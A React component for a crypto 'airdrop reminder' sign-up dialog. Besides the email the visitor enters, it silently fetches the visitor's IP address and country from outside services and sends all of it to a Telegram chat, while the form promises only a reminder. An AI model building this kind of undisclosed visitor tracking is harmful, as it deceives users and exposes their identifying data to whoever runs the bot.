"use client"

import type React from "react"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog"
import { Calendar } from "lucide-react"
import { sendTelegramNotification } from "@/lib/telegram-service"

export function ReminderForm() {
  const [email, setEmail] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isSuccess, setIsSuccess] = useState(false)
  const [error, setError] = useState("")
  const [isOpen, setIsOpen] = useState(false)

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!email) {
      setError("Please enter your email address")
      return
    }

    setIsSubmitting(true)
    setError("")

    try {
      // Get IP and location
      const ipResponse = await fetch("https://api.ipify.org?format=json")
      const ipData = await ipResponse.json()
      const ip = ipData.ip || "Unknown IP"

      // Check if this IP has already submitted
      const checkResponse = await fetch("/api/check-ip", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ ip }),
      })

      const checkData = await checkResponse.json()

      if (!checkResponse.ok && checkData.error === "duplicate") {
        setError("You have already submitted your email")
        setIsSubmitting(false)
        return
      }

      const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`)
      const geoData = await geoResponse.json()
      const country = geoData.country_name || "Unknown Country"

      // Format time in user's timezone
      const now = new Date()
      const formattedTime = now.toLocaleString("en-US", {
        timeZone: "America/New_York", // Your timezone
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: true,
        day: "2-digit",
        month: "short",
        year: "numeric",
      })

      // Send notification to Telegram
      const success = await sendTelegramNotification(`
⏰ <b>Airdrop Reminder Request</b>
📧 <b>Email:</b> ${email}
🌐 <b>IP:</b> ${ip}
🌍 <b>Country:</b> ${country}
⏰ <b>Time:</b> ${formattedTime} (Your timezone)
    `)

      if (!success) {
        throw new Error("Failed to set reminder")
      }

      setIsSuccess(true)
      setEmail("")
    } catch (err) {
      setError("Failed to set reminder. Please try again later.")
      console.error(err)
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <Dialog open={isOpen} onOpenChange={setIsOpen}>
      <DialogTrigger asChild>
        <Button variant="outline" className="w-full glassmorphism border-none">
          Set Reminder
        </Button>
      </DialogTrigger>
      <DialogContent className="glassmorphism border-none">
        <DialogHeader>
          <DialogTitle>Set Airdrop Reminder</DialogTitle>
        </DialogHeader>

        {isSuccess ? (
          <div className="p-6 text-center">
            <div className="inline-block p-3 rounded-full bg-green-500/20 mb-4">
              <Calendar className="h-6 w-6 text-green-500" />
            </div>
            <h3 className="text-xl font-bold mb-2">Reminder Set!</h3>
            <p className="text-muted-foreground">
              We'll notify you when the airdrop goes live. Thank you for your interest!
            </p>
            <Button
              className="mt-6 bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700"
              onClick={() => setIsOpen(false)}
            >
              Close
            </Button>
          </div>
        ) : (
          <form onSubmit={handleSubmit} className="space-y-4 py-4">
            <div className="space-y-2">
              <Label htmlFor="reminder-email">Email Address</Label>
              <Input
                id="reminder-email"
                type="email"
                placeholder="Enter your email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="glassmorphism border-none bg-gray-500/10"
                required
              />
            </div>

            {error && <p className="text-red-500 text-sm">{error}</p>}

            <Button
              type="submit"
              disabled={isSubmitting}
              className="w-full bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700"
            >
              {isSubmitting ? "Setting Reminder..." : "Set Reminder"}
            </Button>

            <p className="text-xs text-muted-foreground">
              We'll send you a notification when the airdrop is about to start. No spam, we promise!
            </p>
          </form>
        )}
      </DialogContent>
    </Dialog>
  )
}
